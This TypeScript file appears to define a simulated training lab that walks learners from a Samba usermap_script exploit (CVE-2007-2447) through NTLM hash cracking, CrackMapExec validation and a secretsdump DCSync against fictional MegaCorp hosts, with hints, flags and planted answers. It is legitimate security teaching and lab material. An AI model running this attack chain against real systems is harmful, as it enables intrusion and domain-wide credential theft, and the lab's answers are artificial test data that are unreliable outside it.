import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

export const redteamToolsLabs: LabScenario[] = [
  {
    id: 'msf-samba-usermap-domain-pivot',
    title: 'Metasploit Framework: Samba usermap_script RCE to Domain Compromise',
    difficulty: 'Hard',
    category: 'Network',
    briefing:
      'MegaCorp\'s file server (lame-fileshare, 10.10.116.2) is still running the Samba 3.0.20-Debian package with ' +
      '"username map script" enabled — the exact configuration behind CVE-2007-2447, one of the most-used ' +
      'introductory Metasploit modules ever written (exploit/multi/samba/usermap_script), because a malformed ' +
      'username is passed unsanitized into a shell command by smbd. The version banner identifies an affected-era ' +
      'candidate but cannot prove the non-default option is enabled; only the isolated lab fixture is known to ' +
      'contain that configuration. This lab walks the full ' +
      'msfconsole workflow for that module, then treats the resulting root shell the way a real operator would: ' +
      'as a base to loot credential material and pivot deeper into the network with the rest of the standard Kali ' +
      'toolkit — hashcat, CrackMapExec, and secretsdump — rather than stopping at the first foothold.',
    objectives: [
      {
        text: 'nmap -sV -p 139,445 10.10.116.2',
        why: 'This identifies the advertised Samba version and exposed SMB ports. Samba 3.0.20 is inside the affected range, but the banner alone cannot prove the non-default username map script option is enabled; treat it as a lead, not confirmation.',
      },
      {
        text: 'Start the framework with msfconsole, then search samba usermap_script',
        why: 'The search finds the maintained module by its vulnerability name. This lab models the commands learners use in Kali instead of accepting a platform-specific exploit shortcut.',
      },
      {
        text: 'Load exploit/multi/samba/usermap_script and inspect it with show options',
        why: 'The module targets Samba 3.0.20–3.0.25rc3 when the non-default username map script option is enabled. It uses SMB1 and defaults to TCP 139; a version string alone is a clue, not proof of vulnerable configuration.',
      },
      {
        text: 'Set the scoped target with set RHOSTS 10.10.116.2, then run',
        why: 'The lab host is explicitly in scope. The real module sends a crafted pre-authentication SMB username; it can execute a command with the Samba process identity, which depends on how the service is configured.',
      },
      {
        text: 'Verify the session with whoami and read /root/root.txt',
        why: 'Confirms the exploit actually landed a working root shell rather than just reporting success, and returns you to your own Kali box — hashcat and your wordlists live there, not on the box you just popped.',
      },
      {
        text: 'cat dc-admin.hash — review the NTLM hash looted from this engagement\'s earlier recon',
        why: 'Real engagements rarely end at one box: a hash captured from this file server (password reuse from an old domain password-reset ticket) is exactly the kind of loot that turns a single low-value target into a path toward the domain controller.',
      },
      {
        text: 'hashcat -m 1000 dc-admin.hash wordlists/mini-rockyou.txt',
        why: 'Mode 1000 is NTLM. Cracking this offline, rather than trying the hash directly against services that expect a plaintext password, is standard operator practice — and it works here in seconds because the password is a common dictionary word.',
      },
      {
        text: 'crackmapexec smb 10.10.116.3 -u Administrator -p <cracked-password>',
        why: 'Validate a recovered credential against the target before committing to a noisier action like a full DCSync — this is the same operational hygiene taught throughout this platform\'s Active Directory labs, applied here to a domain controller instead of a service account.',
      },
      {
        text: 'secretsdump Administrator:<cracked-password>@10.10.116.3',
        why: 'With a validated Administrator credential, this mirrors Impacket\'s real secretsdump DCSync technique: asking the DC to "replicate" its own NTDS.DIT credential database to you. This is the actual endpoint of the engagement — full domain compromise, starting from one misconfigured Samba service.',
      },
    ],
    hints: [
      'nmap -sV -p 139,445 10.10.116.2 — inspect the Samba version and exposed SMB ports.',
      'Run msfconsole, then search samba usermap_script.',
      'Load exploit/multi/samba/usermap_script and run show options. RPORT defaults to 139.',
      'Set RHOSTS to 10.10.116.2, then run. This is a deliberately vulnerable, isolated training host.',
      'Verify the session with whoami and read /root/root.txt for the first proof.',
      'Back on your attack box: cat dc-admin.hash to see the looted NTLM hash and which host it belongs to.',
      'hashcat -m 1000 dc-admin.hash wordlists/mini-rockyou.txt — mode 1000 is NTLM, and the password is a common dictionary word.',
      'crackmapexec smb 10.10.116.3 -u Administrator -p dragon — validate the cracked password before using it for anything noisier.',
      'secretsdump Administrator:dragon@10.10.116.3 — full DCSync, mirroring the real Impacket technique. The Administrator line in the dump is your final flag.',
    ],
    totalFlags: 3,
    attacker: attacker({
      'dc-admin.hash': file(
        '#HASHCAT_HASH:8846f7eaee8fb117ad06bdd830b7586c\n#HASHCAT_PLAINTEXT:dragon\n#HASHCAT_FLAG:flag{ntlm_hash_cracked_password_reuse_across_domain}\n' +
          'Captured NTLM hash for MEGACORP\\Administrator, recovered from lame-fileshare (10.10.116.2) — reused ' +
          'across the domain from an old password-reset ticket nobody rotated afterward.\n' +
          'Target: 10.10.116.3 (MEGACORP-DC)\n' +
          'Hash type: NTLM (mode 1000)\n',
      ),
      wordlists: dir({ 'mini-rockyou.txt': file('123456\npassword\ndragon\nletmein\nqwerty\nsummer2024\ntrustno1\n') }),
    }),
    network: [
      {
        hostname: 'lame-fileshare',
        ip: '10.10.116.2',
        os: 'Ubuntu 8.04 (Metasploitable2-style legacy file server)',
        metasploitModule: {
          path: 'exploit/multi/samba/usermap_script',
          requiredOptions: [],
          defaultOptions: { RPORT: '139' },
        },
        services: [
          { port: 21, name: 'ftp', version: 'vsftpd 2.3.4' },
          { port: 139, name: 'netbios-ssn', version: 'Samba smbd 3.0.20-Debian' },
          { port: 445, name: 'microsoft-ds', version: 'Samba smbd 3.0.20-Debian' },
        ],
        users: [],
        root: dir({
          root: dir({
            'root.txt': file(
              'CVE-2007-2447 confirmed — smbd\'s "username map script" option passed an attacker-controlled ' +
                'username straight into a shell command, running as root with zero authentication required.\n' +
                'flag{samba_usermap_script_cve_2007_2447_unauth_root}\n',
            ),
          }),
        }),
      } as HostDef,
      {
        hostname: 'MEGACORP-DC',
        ip: '10.10.116.3',
        os: 'Windows Server 2016 (Domain Controller)',
        services: [{ port: 445, name: 'microsoft-ds', version: 'SMB (Domain Controller)' }],
        users: [{ username: 'Administrator', password: 'dragon', canDcsync: true }],
        ntdsHashes:
          'megacorp.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:flag{samba_foothold_to_domain_admin_full_compromise}:::\n' +
          'megacorp.local\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::',
        root: dir({}),
      } as HostDef,
    ],
  },
];
